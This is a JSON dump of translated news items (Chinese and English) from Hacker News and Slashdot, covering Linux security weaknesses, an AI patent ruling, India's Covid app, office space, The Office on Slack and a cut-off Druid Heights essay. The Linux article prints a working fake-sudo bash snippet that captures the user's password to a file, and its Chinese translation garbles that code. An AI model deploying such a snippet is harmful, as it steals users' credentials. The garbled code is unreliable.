[{"category": "", "categoryclass": "", "imagename": "", "infoid": 1001762, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "由于不可避免的书呆子气，本文中的Linux指的是标准Linux或GNU/Linux发行版。\n人们普遍认为Linux是一个非常安全的操作系统。由于各种不同的原因，这与事实相去甚远。标准桌面中没有强大的沙盒。这意味着所有应用程序都可以访问彼此的数据，并可以窥探您的个人信息。大多数程序都是用内存不安全的语言(如C或C++)编写的，这是大多数已发现的安全漏洞的原因，而诸如控制流完整性等现代利用漏洞缓解措施并未得到广泛使用。内核也非常缺乏安全性。它是一个完整的内核，完全用内存不安全的语言编写，每个月都会发现数百个错误，其中许多是安全漏洞。事实上，在内核中发现了如此多的错误，开发人员无法跟上，这导致许多错误在很长一段时间内没有得到修复。内核在利用缓解方面也落后了几十年，许多内核开发人员根本不关心。在普通桌面上，具有sudo访问权限的受损非root用户帐户几乎等同于完全root危害，因为攻击者有太多方法可以检索sudo密码。通常，标准用户是组sudo的一部分，这使得这是一个巨大的问题，并且使得sudo密码几乎是安全剧场。例如，攻击者可以利用过多的按键记录机会，如X缺少GUI隔离、/proc中的大量信息泄露、使用LD_PRELOAD挂接到每个进程等等。即使我们减轻了记录击键的每一种方式，攻击者也可以设置自己的假sudo程序来窃取用户密码。这就是获取sudo密码所需的全部内容：cat&lt；&lt；\\EOF&gt；/tmp/sudo#！/bin/bashif[[&#34；${@}&#34；=&#34；&#34；]]；然后/usr/bin/sudoElse读取-s-r-p&#34；[sudo]${user}：&#34；password echo&#34；${password}&#34；&。\\n抱歉，请重试。&#34；/usr/bin/sudo${@}fiEOFchmod+x/tmp/sudoexport path=&#34；/tmp：${path}&#34；\n现在攻击者只需一个modbe即可完全访问内核。\n标准系统强化不足以解决任何这些大规模的架构安全问题。限制几件小事不会解决这个问题。同样，发行版默认部署的一些常见安全功能也不会解决这个问题。仅仅因为您的发行版在没有创建严格策略的情况下启用了MAC框架，并且仍然不受限制地运行大多数进程，并不意味着您可以摆脱这些限制。一个相当安全的Linux发行版所需的强化程度远远超出人们的想象。您将需要完整的系统MAC策略、完全验证的引导(不仅仅是引导链、整个基本系统)、强大的沙箱体系结构、强化的内核、广泛使用的现代利用漏洞缓解措施等等。实际上正在解决这些问题的一个Linux发行版是Whonix。\nFlatpak的目标是沙箱应用程序，但它的沙箱操作存在很大缺陷。它完全信任应用程序，并允许它们指定自己的策略。这意味着安全性是可选的，应用程序可以选择不进行足够的沙箱保护。Flatpak的权限也过于宽泛，没有意义。例如，许多应用程序附带了filessystem=home，这是对用户主目录的读写访问权限，允许访问所有个人文件，并允许通过写入~/.bashrc或类似文件进行简单的转义。Flatpak广泛权限的另一个例子是它如何允许对X11套接字的不经过滤的访问，由于X11&#39；缺乏GUI隔离，因此允许轻松转义。通过Xpra之类的嵌套X11服务器添加X11沙箱很容易，但Flatpak开发人员拒绝承认这一点，并继续声称X11是不可能安全的。更多的例子是Flatpak如何给予目录(如/sys或/proc(以信息泄露而闻名的内核接口)的完全访问权限)。", "note_en": "Due to inevitable pedanticism, &#34;Linux&#34; in this article refers to a standard Linux or GNU/Linux distro.\n    There is a common assumption that Linux is a very secure operating system. This is very far from the truth for various different reasons.     There is no strong sandboxing in the standard desktop. This means all applications have access to each other’s data and can snoop on your personal information. Most programs are written in memory unsafe languages such as C or C++ which has been the cause of  the majority of discovered security vulnerabilities and modern exploit mitigations such as Control-Flow Integrity are not widely used.     The kernel is also very lacking in security. It is a monolithic kernel written entirely in a memory unsafe language and has hundreds of bugs, many being security vulnerabilities,  found each  month. In fact, there are so many bugs being found in the kernel, developers can’t keep up which results in many of the bugs  staying unfixed for a long time. The kernel is also  decades behind in exploit mitigations and many kernel developers simply  do not care enough.     On ordinary desktops, a compromised non-root user account with access to  sudo is almost equal to full root compromise as there are too many ways for an attacker to retrieve the sudo password. Usually, the standard user is part of group  sudo which makes this a massive issue and makes a sudo password almost security theater. For example, the attacker can exploit the plethora of keylogging opportunities such as  X’s lack of GUI isolation, the  many infoleaks in  /proc, use   LD_PRELOAD to hook into every process and so much more. Even if we mitigate every single way to log keystrokes, the attacker can just setup their own fake sudo program to grab the user password.     This is all it takes to get your  sudo password:  cat &lt;&lt;\\EOF &gt; /tmp/sudo#!/bin/bashif [[ &#34;${@}&#34; = &#34;&#34; ]]; then /usr/bin/sudoelse read -s -r -p &#34;[sudo] password for ${USER}: &#34; password echo &#34;${password}&#34; &gt; /tmp/password echo -e &#34;\\nSorry, try again.&#34; /usr/bin/sudo ${@}fiEOFchmod +x /tmp/sudoexport PATH=&#34;/tmp:${PATH}&#34;\n   Now the attacker is just a  modprobe away from full kernel access.\n    Standard system hardening is not enough to fix any of these massive architectural security issues. Restricting a few minor things is not going to fix this. Likewise, a few common security features distros deploy by default is also not going to fix this. Just because your distro enables a MAC framework without creating a strict policy and still running most processes unconfined, doesn&#39;t mean you can escape from these.     The hardening required for a reasonably secure Linux distro is far greater than people assume. You will need full system MAC policies, full verified boot (not just the boot chain, the entire base system), a strong sandboxing architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty more.     One Linux distro that actually is working on fixing these issues is  Whonix.\n    Flatpak aims to sandbox applications but its sandboxing is very flawed. It fully trusts the applications and allows them to specify their own policy. This means security is optional and apps can just choose not to be sufficiently sandboxed.     Flatpak&#39;s permissions are also far too broad to be meaningful. For example, many applications come with  filesystem=home which is read-write access to the user&#39;s home directory, giving access to all of your personal files and allowing trivial escapes via writing to  ~/.bashrc or similar.     Another example of Flatpak&#39;s broad permissions is how it allows unfiltered access to the X11 socket, allowing easy escapes due to X11&#39;s lack of GUI isolation. Adding X11 sandboxing via a nested X11 server such as Xpra is easy but Flatpak developers refuse to acknowledge this and continue to claim  &#34;X11 is impossible to secure&#34;.     Even more examples of this is how Flatpak gives full access to directories such as  /sys or  /proc (kernel interfaces known for information leaks).", "posttime": "2020-05-12 11:55:01", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "linux,sudo", "title": "Linux(In)安全性", "title_en": "Linux (In)Security", "transed": 1, "url": "https://madaidans-insecurities.github.io/linux.html", "via": "", "real_tags": ["linux", "sudo"]}, {"category": "", "categoryclass": "", "imagename": "8d8751343044ace6463bc2b9e82906ac.jpg", "infoid": 1001761, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "(CNN)人工智能是未来。如果“西部世界”或“黑镜”是可信的，那么计算机统治我们所有人的那一天很快就会到来。\n美国专利商标局否认了代表人工智能系统DABUS申请的两项专利，并公布了一项裁决，称美国的专利只能授予自然人。\n这两项专利分别是食品容器和手电筒，由人工智能研究人员、DABUS&39；创建者斯蒂芬·泰勒(Stephen Thaler)申请。根据美国专利商标局提交的文件，泰勒称DABUS是一台创意机器，并希望人工智能能完全归功于这些发明。文件称，泰勒辩称，允许一台机器被列为发明家将激励使用人工智能系统的创新。CNN已联系泰勒请其置评。\n然而，根据USPTO的裁决，发明只能由自然人提交(并根据你想要的哲学程度来构思)，这一点反映在专利法的语言和之前的联邦法院裁决中。\n说到哲学，这项裁决引用了1994年联邦巡回法院的一项裁决，该裁决阐述了发明的本质，这种方式肯定会让你的大脑陷入自我反省的迷宫。\n构思是发明力的试金石，是完成发明的精神部分。它是发明者头脑中形成的关于完整的、可操作的发明的明确的、永久的想法……。[构思]是一种心理行为.&#34；\n在欧洲和英国，将DABUS列为发明者的专利也因与人格有关的类似原因而被拒绝。欧洲专利局还提出了这样一个问题，即在这种情况下，究竟由谁来行使授予发明人的权利。\nThaler是DABUS背后的头脑，是一名物理学家，也是Imagination Engines的创始人，这是一家研究和开发人工神经网络的公司。DABUS就是这样一种人工神经网络。想象力引擎将DABUS描述为一个真正的人工发明家，它被编程为模仿人类思维的神经模式，这些模式导致了神秘的、原始的发明火花。", "note_en": "(CNN)Artificial intelligence is the future. If &#34;Westworld&#34; or &#34;Black Mirror&#34; are to be believed, there will soon come a day when the computers rule us all.\n  The USPTO  has denied a pair of patents filed on behalf of DABUS, an artificial intelligence system, and published a ruling that says US patents can only be granted to &#34;natural persons.&#34;\n   The two patents were for a food container and a flashlight, and  were filed by Stephen Thaler, an AI researcher and DABUS&#39; creator. According to the filing from the USPTO, Thaler calls DABUS a &#34;creativity machine&#34; and wanted the AI to get full credit for the inventions. The filing says Thaler argued that &#34;allowing a machine to be listed as an inventor would incentivize innovation using AI systems.&#34; CNN has reached out to Thaler for comment.\n    However, according to the USPTO&#39;s ruling, inventions can only be submitted (and depending on how philosophical you want to get, conceived) by a &#34;natural person,&#34; as reflected in the language of patent law and also in previous federal court rulings.\n Speaking of philosophy, the ruling quotes a Federal Circuit court decision from 1994 that expounds on the nature of invention in a way that&#39;s certain to send your brain down the maze of reflexive self-awareness.\n &#34;Conception is the touchstone of inventorship, the completion of the mental part of invention. It is the formation in the mind of the inventor, of a definite and permanent idea of the complete and operative invention ... [Conception] is a mental act ...&#34;\n Patents that list DABUS as the inventor  have also been denied in Europe and the UK for similar reasons related to personhood. The European Patent Office also raised the issue of who, exactly, would enforce the rights granted to an inventor under such a circumstance.\n   Thaler, the mind behind DABUS, is a physicist and founder of Imagination Engines, a company that researches and develops artificial neural networks.  DABUS is one such artificial neural network. Imagination Engines describes DABUS as a &#34;true artificial inventor&#34; that is programmed to mimic the neural patterns of human thought that lead to the mysterious, primal spark of invention.", "posttime": "2020-05-12 11:54:38", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "人工智能,表示,intelligence,发明", "title": "专利局表示，人工智能在技术上不能发明东西", "title_en": "Artificial Intelligence can't technically invent things, says patent office", "transed": 1, "url": "https://edition.cnn.com/2020/04/30/us/artificial-intelligence-inventing-patent-office-trnd/index.html", "via": "", "real_tags": ["人工智能", "表示", "发明"]}, {"category": "", "categoryclass": "", "imagename": "c8ba03b7e3a3c557790d922abeb1fe6b.jpg", "infoid": 1001760, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "世界上从来没有见过像Aarogya Setu这样的东西。两个月前，印度还不存在用于追踪冠状病毒接触者的应用程序；现在它已经拥有近1亿用户。印度总理纳伦德拉·莫迪(Narendra Modi)在发布时敦促全国13亿人中的每一个人都下载它，结果在发布后的两周内，它成为有史以来下载量最快的应用程序，下载量达到5000万次。\n“我们打败了精灵宝可梦Go，”领导印度政府这项服务开发的阿纳布·库马尔(Arnab Kumar)微笑着说。\n但是，尽管这款应用的增长是史无前例的，但它在更重要的方面是非同寻常的：如果你不安装它，你可能会丢掉工作，被罚款，或者坐牢。\n根据麻省理工学院技术评论的Covid Tracking Tracker(全球接触者追踪应用数据库)的数据，印度目前是世界上唯一一个强制数百万人使用冠状病毒追踪应用的民主国家。\n虽然官方政策是下载这款应用是自愿的，但事实是，政府雇员被要求使用它，而主要的私人雇主和房东也在强制使用它。据报道，诺伊达市现在正在罚款，甚至威胁要逮捕任何没有在手机上安装这款应用的人。\n这是戏剧性的一步，引发了全国和全球公民自由专家的猛烈批评。\n印度议会知名议员、反对党印度国大党(Indian National Congress)前领导人拉胡尔·甘地(Rahul Gandhi)是批评这款应用的人之一，他指责这款应用“没有机构监督”，并引发了“严重的数据安全和隐私问题”。\n“科技可以帮助保护我们的安全，”甘地最近在推特上写道。“但在未经公民同意的情况下，不能利用恐惧来追踪他们。”\n数字权利组织Access Now的高级政策分析师埃斯特尔·马塞(Estelle Massé)表示：“这里存在一种侵犯人权的行为，这是没有道理的。”“存在启动一种可在大流行后重新用于监测的工具的风险。”\n“麻省理工学院技术评论”的数据库显示，印度的应用程序在许多其他方面也是独一无二的。许多国家正在开发有限的服务，使用蓝牙或GPS向与被发现感染冠状病毒的人进行互动的人发出“暴露通知”。然而，印度的APP是一个庞大的一体化项目，远远超过大多数其他国家正在建设的项目。它跟踪蓝牙联系事件和位置-就像许多其他应用程序一样-但也会给每个用户一个颜色编码的徽章，显示感染风险。除此之外，Aarogya Setu(在印地语中的意思是“通往健康的桥梁”)还提供远程医疗、电子药房和诊断服务。它被所有印度电信公司列入白名单，因此使用它不计入移动数据限制。\n这款应用程序的缺失也让它脱颖而出。印度没有国家数据隐私法，也不清楚谁有权访问这款应用程序的数据，在什么情况下也不清楚。在这一点上，访问或使用数据没有强大的、透明的策略或设计限制。开发商名单主要由私营部门志愿者组成，并不完全公开。\n库马尔强调，这款应用程序是按照目前正在议会审议的一项数据隐私法案草案的标准建造的，并表示对其收集的数据的访问受到严格控制。但批评人士表达了担忧，因为它不是开源的，尽管印度政府规定其应用程序必须将代码向公众开放。库马尔说，这是Aarogya Setu的一个目标，将在未来发生，但他无法确认时间表或预期日期。\n当Aarogya Setu第一次被宣布时，印度政府确实寻求同意，使用这款应用最初听起来像是自愿的。今天，至少有100万人接到了使用它的命令，其中包括中央政府的工作人员和像Zomato和Swiggy这样的私营公司的员工。这在印度是一种实践得很好的策略，在印度，“自愿强制”技术有被用作某些重要权利的把关人的历史。\n虽然印度是唯一一个强制数百万人使用其联系人追踪应用的民主国家，但其他民主国家已经与移动电话公司达成协议，可以获取居民的位置数据。在欧洲，这些数据在很大程度上是聚合和匿名的。在以色列，专注于大流行的执法部门使用了一个通常为反恐目的保留的电话跟踪数据库。以色列政府的策略一直是一场法律战的主题，这场官司最终进入了该国的最高法院和立法机构。\n这些困难中的许多都可以追溯到缺乏透明度。在发布时，这款应用的隐私政策和服务条款都不是公开的，尽管有要求，但开发人员并没有分享它们。由于这款应用程序不是开源的，其代码和方法不容易被第三方审查，而且没有公开的日落条款说明这款应用程序何时将不再是强制性的，尽管库马尔表示，数据会在患病个人最多60天和健康人最多30天后滚动删除。印度的国家和邦政府将走多远，目前还没有明确的路线图：最近的一篇报道称，政府希望在所有新款智能手机上预装Aarogya Setu；另一篇报道称，这款应用可能很快就会被要求旅行。\n在这款应用开发的早期，Kumar表示将利用苹果和谷歌为iPhone和Android联合开发的技术。该系统将在几天后发布，但现在它附带了一些规则，包括要求用户同意和禁止位置跟踪-这两项Aarogya Setu都没有遵守。库马尔说，谷歌工程师一直与Aarogya Setu的开发者保持密切联系，他的团队将评估他们是否仍能实施分散的硅谷系统，该系统旨在保护隐私。谷歌和苹果已经将这款应用快速打入Android和iOS应用商店。\n但人们仍然深感担忧的是，模糊自愿和强制之间的界限，以及保护隐私和侵犯隐私之间的界限，将会产生长期的后果。\n“国家没有做出任何努力来赢得公民的信任，”公民技术组织Indic Project的执行董事阿尼瓦尔·阿拉温德(Anivar Aravind)说。“这里有一群私营部门的企业志愿者，他们没有任何责任，他们为政府开发了一款应用程序，迫使每个人的个人设备。”", "note_en": "The world has never seen anything quite like Aarogya Setu. Two months ago, India’s app for coronavirus contact tracing didn’t exist; now it has nearly 100 million users. Prime Minister Narendra Modi boosted it on release by urging every one of the country’s 1.3 billion people to download it, and the result was that within two weeks of launch it became the fastest app ever to reach 50 million downloads.\n  “We beat Pokémon Go,” says a smiling Arnab Kumar, who is leading development of the service for the Indian government.\n  But although the app’s growth is unprecedented, it is extraordinary in an even more important way: if you don’t install it, you might lose your job, get fined, or go to jail.\n  India is currently the only democratic nation in the world that is making its coronavirus tracking app mandatory for millions of people,   according to MIT Technology Review’s Covid Tracing Tracker, a database of global contact tracing apps.\n  While official policy is that downloading the app is voluntary, the truth is that government employees are  required to use it, while major private employers and landlords are  mandating it as well. The city of Noida is now  reportedly fining and even threatening to arrest anyone who fails to install the app on their phone.\n  It’s a dramatic step generating fierce criticism from civil liberties experts nationally, and from all over the globe.\n  Rahul Gandhi, a prominent member of the Indian parliament and former leader of the opposition Indian National Congress, is among those who have criticized the app, charging that it has “no institutional oversight” and raises “serious data security and privacy concerns.”\n  “Technology can help keep us safe,” Gandhi recently tweeted. “But fear must not be leveraged to track citizens without their consent.”\n  “There is an infringement on human rights that is not justified here,” says Estelle Massé, a senior policy analyst at the digital rights group Access Now. “There is a risk of initiating a tool that can be repurposed for surveillance after the pandemic.”\n    MIT Technology Review’s database shows that India’s app is unique in a number of other ways, too. Many countries are developing limited services that use Bluetooth or GPS to give “exposure notifications” to people who have interacted with someone found to have covid-19. India’s app, though, is a massive all-in-one undertaking that far exceeds what most other countries are building. It tracks Bluetooth contact events and location—as many other apps do—but also gives each user a color-coded badge showing infection risk. And on top of this, Aarogya Setu (which means “a bridge to health” in Hindi) also offers access to telemedicine, an e-pharmacy, and diagnostic services. It’s whitelisted by all Indian telecom companies, so using it does not count against mobile data limits.\n  What the app lacks also sets it apart. India has no national data privacy law, and it’s not clear who has access to data from the app and in what situations. There are no strong, transparent policy or design limitations on accessing or using the data at this point. The list of developers, largely made up of private-sector volunteers, is not entirely public.\n  Kumar stresses that the app was built to the standards of a draft data privacy bill that is currently in the country’s parliament, and says access to the data it collects is strictly controlled. But critics have expressed concern because it is not open source, despite an Indian government mandate that its apps make their code available to the public. Kumar says that this is a goal for Aarogya Setu and will happen down the line, but he could not confirm a timeline or expected date.\n  When Aarogya Setu was first announced, the Indian government did seek consent, and using the app initially sounded voluntary. Today, at least 1 million people have been given orders to use it, including central government workers and employees of private companies like the food delivery services Zomato and Swiggy. It’s a well-practiced tactic in India, where “voluntary mandatory” technology has a history of being used as a gatekeeper to certain important rights.\n  While India is the only democracy to make its contact tracing app mandatory for millions of people, other democracies have struck deals with mobile phone companies to access location data from residents. In Europe, the data has largely been aggregated and anonymized. In Israel, law enforcement focused on the pandemic has used a phone tracking database normally reserved for counterterrorism purposes. The Israeli government’s tactics have been the subject of a legal battle that made its way up to the country’s Supreme Court and legislature.\n    Many of these difficulties can be traced to a lack of transparency. Neither the privacy policy nor the terms of service for the app were publicly accessible at the time of publication, and the developers have not shared them despite requests. Since the app is not open source, its code and methods can’t easily be reviewed by third parties, and there is no public sunset clause stating when the app will cease to be mandatory, although Kumar says data is deleted on a rolling basis after, at most, 60 days for sick individuals and 30 days for healthy people. And there is no clear road map for how far India’s national and state governments will go: one recent  report said the government wants Aarogya Setu preinstalled on all new smartphones; another said the app may soon be  required to travel.\n  In the early days of the app’s development, Kumar said it would leverage the technology being jointly developed by Apple and Google for iPhone and Android. That system will be released in just a few days,  but it now comes with rules that include requiring user consent and banning location tracking—neither of which Aarogya Setu complies with. Kumar says Google engineers have been in close contact with Aarogya Setu’s developers, and his team will evaluate whether they can still implement the decentralized Silicon Valley system, which is intended to preserve privacy. Google and Apple have fast-tracked the app into both the Android and iOS app stores.\n  But there are still deep concerns that blurring the line between voluntary and mandatory, and between privacy-preserving and privacy-invading, will have long-term consequences.\n  “There is no effort made by the state to earn citizen trust,” says Anivar Aravind, executive director at the civic-technology organization Indic Project. “Here are a set of private-sector corporate volunteers, with no accountability, that built an app for governments that is forced to personal devices of everyone.”", "posttime": "2020-05-12 11:54:00", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "程序,app,forcing", "title": "与其他任何民主国家不同，印度正在强迫人们使用其Covid应用程序", "title_en": "India is forcing people to use its Covid app, unlike any other democracy", "transed": 1, "url": "https://www.technologyreview.com/2020/05/07/1001360/india-aarogya-setu-covid-app-mandatory/", "via": "", "real_tags": ["程序", "app", "forcing"]}, {"category": "", "categoryclass": "", "imagename": "c711677847be90f3d58907904fa916ad.jpeg", "infoid": 1001759, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "前谷歌首席执行官埃里克·施密特认为，在冠状病毒大流行消退后，办公空间的需求将会更大。\n施密特周日在“面向全国”节目上发表的言论，似乎与人们普遍认为的一种观点相矛盾，即随着员工学会在家高效工作，办公室可能正在走下坡路。\n在做客“面向全国”节目时，这位65岁的老人表示，他认为办公室里社交距离的渴望会让办公空间变得更加昂贵。\n施密特说：我猜我们对办公空间的需求会更大，而不是更少，因为人们会想要社交距离。\n我们将不得不考虑中心辐射式系统，当地人不会出行这么远，因为他们不想坐这么长时间的公共交通工具。因此，我们将不得不真正重新思考企业是如何运作的。他们需要他们的员工回来。\n曾在2001年至2011年领导谷歌的施密特表示，随着同一家公司的员工在不同地点工作，全球特大城市的密度将发生变化。\n他说：如果你把它想象成一个雇主，你会有一群员工，他们中的一些人渴望回到办公室，还有一些人担心，如果他们去办公室，他们会死，他说，“如果你把它想象成一个雇主，你会发现他们有一群员工，他们中的一些人渴望回到办公室，还有一些人担心如果他们去办公室，他们会死。”\n他们非常担心他们的免疫功能受损，或者你得了什么病。因此，他们将不得不拿出灵活的安排。所以想象一下有三四个人：一个人去办公室，一个人呆在家里，还有一些人去当地或附近的工作环境。它会改变模式。\n我们曾经遇到过这样的情况，人们以令人难以置信的集中方式搬到了超级城市。在接下来的几年里，这种情况将会改变。你不需要在这个超级城市里才能参与到这些超级城市的兴奋中来。\nCNET周六报道，自2011年以来一直担任谷歌顾问的施密特已于2月份辞去该职位。根据彭博亿万富翁指数，这位前高管仍然是世界上最富有的人之一，净资产为155亿美元。", "note_en": "Former Google CEO Eric Schmidt thinks office space will be in greater demand after the coronavirus pandemic subsides.\n Schmidt&#39;s remarks on &#34;Face the Nation&#34; on Sunday appeared to contradict a widespread belief that offices might be on the decline as workers learn to work effectively from home.\n During his  appearance on &#34;Face the Nation,&#34; the 65-year-old said he thought the desire for social distancing within offices would place a premium on office space.\n &#34;My guess is we&#39;ll have more demand for office space, not less, because people will want social distancing,&#34; Schmidt said.\n   &#34;We&#39;re going to have to think about hub-and-spoke systems where local people don&#39;t travel so far because they don&#39;t want to be in public transit for so long. So we&#39;re going to have to really rethink how businesses operate. They need their employees back.&#34;\n Schmidt, who led Google from 2001 to 2011, said the density of global megacities would change as employees at the same firm work in different locations.\n &#34;If you think of it as an employer, you have a bunch of employees, some of whom are dying to get back to the office and some people who are afraid that if they go to the office they will die,&#34; he said.\n &#34;They&#39;re very concerned about they&#39;re immunocompromised or what have you. So they&#39;re going to have to come up with flexible arrangements. So imagine that there are three or four people: one will go to the office, one will stay home, some will go to some local or near-their-town working environment. It will change the pattern.\n   &#34;We&#39;ve had this situation where people move to supercities in these incredibly concentrated ways. That will change in the next few years. You don&#39;t need to be in the supercity in order to participate in the excitement of these supercities.&#34;\n CNET reported on Saturday that Schmidt, who&#39;s been an adviser to Google since 2011, had stepped down from that position in February. The former exec remains one of the wealthiest people in the world, with a net worth of $15.5 billion,  according to the Bloomberg Billionaires Index.", "posttime": "2020-05-12 11:53:32", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "预测,schmidt,员工", "title": "埃里克·施密特预测，公司在Covid之后将需要更多办公空间，而不是更少", "title_en": "Eric Schmidt predicts companies will need more office space post-Covid, not less", "transed": 1, "url": "https://www.businessinsider.com/eric-schmidt-google-companies-office-space-pandemic-2020-5", "via": "", "real_tags": ["预测", "schmidt", "员工"]}, {"category": "", "categoryclass": "", "imagename": "10bfe0da1f8f93b17ebddbed3bcd0a77.png", "infoid": 1001758, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "如果你去掉“办公室”中人物之间的身体互动，并试图通过“松弛”讲同样的笑话，那么“办公室”还能工作吗？\n这是一个创意集体MSCHF打算找出的问题，他们在“松弛”上重现了这部电视剧的全部201集。观众将加入现场松弛，不同的频道专门针对不同的部门，包括会计、仓库和一般办公室。请观众避免在“公司”频道发帖，但鼓励观众进出频道以跟上剧集的发展，因为它们并不都在一个频道播放。一位代表告诉The Verge，由于这是一场现场直播，不恰当的信息和图片确实会弹出，但MSCHF团队有一些版主努力让它尽可能地没有巨魔。\n有些笑话比其他的更容易翻译；其中一个例子是该剧第二季中的“伤害”。迈克尔·斯科特(史蒂夫·卡雷尔饰)被放在床脚的乔治·福尔曼烤架烫伤了脚，他打电话到办公室寻求帮助。这一集的对话是通过电话进行的，但MSCHF团队使用Slake重新制作了对话，涉及到了原始小品中的所有角色。\nMSCHF战略主管丹尼尔·格林伯格(Daniel Greenberg)告诉The Verge：“自从”办公室“播出以来，工作和办公室文化的性质发生了巨大变化，其中很多都围绕着我们使用技术的方式。”“这是真人从周一到周五朝九晚五的现场体验。”\nMSCHF在大流行来袭之前就开始了这个项目，但感觉从来没有这么及时过。SLACK和电话会议工具Zoom一样，随着人们离家上班，使用率大幅上升。首席执行官斯图尔特·巴特菲尔德(Stewart Butterfield)几周前在一条冗长的推文中分享了数字；3月10日，Slake的并发用户超过了1000万。到3月25日，它的用户将增加250万。\n巴特菲尔德在推特上发帖截图称：“我们的业务发展非常迅速，而且在未来的很多年里还会继续这样做。”他在推特上发的截图显示，“我们的业务令人难以置信，而且这种情况还会持续下去。”“我们提供了一个平台，在未来几年里，这个平台对世界将变得更加有用。”\n把“办公室”想象成一部以“松弛”为基础的职场喜剧是很有趣的。就连“办公室”的联合制片人本·西尔弗曼(Ben Silverman)和保罗·利伯斯坦(Paul Lieberstein)也在制作一部新的系列片(另一部工作场所喜剧)，故事完全发生在电脑屏幕上。视觉笑料从闹剧喜剧到GIF，再到公共房间里用斜体写成的“OK Michael”回答。尽管剧本在改编过程中没有改变，格林伯格告诉The Verge，团队确实通过在服务中找到GIF和其他功能来翻译喜剧，从而找到了让笑话在Slake上发挥作用的方法。\n每集可能需要大约两到三周的时间才能在“松弛”上“播出”，所以要安顿下来。", "note_en": "If you take out  The Office’s physical interactions between characters  and try to tell the same jokes over Slack, does  The Office still work?\n It’s a question that creative collective MSCHF set to find out, recreating all 201 episodes of the series over Slack. Viewers will  join a live Slack, where different channels are dedicated to various departments, including accounting, warehouse, and a general office room. Viewers are requested to avoid posting in the “company” channels, but are encouraged to pop in and out of channels to keep up with the episodes as they don’t all play in one. Since it is a live Slack, inappropriate messages and images do pop up, but the MSCHF team has a number of moderators working to keep it as troll-free as possible, a representative told  The Verge.\n Some jokes are easier to translate than others; one  example used is “The Injury” from the show’s second season. After burning his foot on a George Foreman grill that he keeps at the foot of his bed, Michael Scott (Steve Carell) calls into the office to try to get some help. The conversation takes place over the phone in the episode, but the MSCHF team used Slack to recreate it, involving all the characters from the original sketch.\n   “Since  The Office aired, the nature of work and office culture has changed drastically, a lot of which is centered around the way we use technologies,” Daniel Greenberg, head of strategy at MSCHF, told  The Verge. “This is a live experience by real people Mondays through Fridays, nine-to-five.”\n MSCHF started working on the project before the pandemic hit, but it’s never felt so timely. Slack, like teleconferencing tool Zoom, is seeing a massive uptick in usage as people move to work from home. CEO Stewart Butterfield shared numbers in a lengthy tweet thread a few weeks back; on March 10th, Slack’s concurrent users passed 10 million. It would jump by 2.5 million users by March 25th.\n “We have an incredible business that has been growing very quickly and that will continue to do so for many, many years to come,” Butterfield told Slack employees, as seen in  screenshots he tweeted. “We provide a platform that is going to become even more useful to the world in the years to come.”\n   It’s fun to imagine  The Office as a Slack-based workplace comedy. Even Ben Silverman and Paul Lieberstein, co-producers on  The Office,  are working on a new series (another workplace comedy) that takes place entirely over computer screens. Visual gags go from slapstick comedy to GIFs and italicized “OK Michael” responses in public rooms. Although the script hasn’t changed in the adaptation process, Greenberg told  The Verge the teams did figure out ways to make the jokes work on Slack by finding GIFs and other features within the service to translate the comedy.\n It could take roughly two to three weeks for each episode to “air” over Slack, so settle in.", "posttime": "2020-05-12 11:40:02", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "办公室,office", "title": "“办公室”(The Office)201集现在都在“松弛”(Slake)上播出。", "title_en": "All 201 Episodes of 'The Office' Are Now Playing Out Over Slack", "transed": 1, "url": "https://www.theverge.com/2020/5/11/21254391/the-office-slack-episode-dunder-mifflin-mschf-work-from-home", "via": "", "real_tags": ["办公室", "office"]}, {"category": "", "categoryclass": "", "imagename": "19a5ee2fa39053e19039ee92f5c9ace6.jpeg", "infoid": 1001756, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "我收集了一些我的照片，并怀着这个目标写下了下面的内容：让你对一个令人惊叹的地方德鲁伊高地(Druid Heights)感到同样的迷恋，就像我在2016年11月16日参观那里之后所做的那样。对于你们所有人，特别是那些在手机上观看的人，一旦你(希望如此)，有70张照片会混入我的描述性文字中。把引言通读一遍。好好享受吧！要了解更多关于这个特殊的地方及其历史的信息，请转到拯救德鲁伊高地Facebook群页。\n8/29/18更新：自从这第一个故事以来，我已经在网上发布了几个关于德鲁伊高地的更简短的故事。这是最完整的视图。其他的可以通过使用德鲁伊高地或我的名字Michael Toivonen作为搜索词来搜索Medium来找到。\n对我来说，事情是这样开始的：2016年初的一天，一个偶然的机会，我想起了一个被遗忘已久的名字，德鲁伊高地(Druid Heights)。上世纪70年代，我第一次听到这个词是在加州米尔谷(Mill Valley)附近的一所高中，距今已经40年了。除了这个名字，我当时只知道，我一直在读的一位东方宗教作家艾伦·瓦茨(Alan Watts)去世时住在那里，还有一个名叫埃尔莎·吉洛(Elsa Gidlow)的女人，她可能是一位诗人，仍然住在那里。我很感兴趣，但我从未学到更多。\n40年后的一个雨天，当这个不同寻常的地名突然出现在我的脑海中时，我准备好了我的笔记本电脑，准备发起一个查询。我发现了一些报纸文章和一些图片。德鲁伊高地似乎比我模糊地想象的要多得多，…。。\n在我访问那里的时候，我已经了解到两位主要的创始人，Elsa Gidlow和Roger Somers，都是富有创造力和多产的人，他们的磁性个性非常不同，但也相当互补，特别是在他们共同吸引广泛的重要文化人物到德鲁伊高地的能力方面。尽管德鲁伊高地的面积相对较小，但两位主要创始人的个性差异意味着同时有两个截然不同的社交圈在那里运作，这就增加了它的意义。\n出生于英国约克郡和加拿大魁北克省的埃尔莎·吉德洛(Elsa 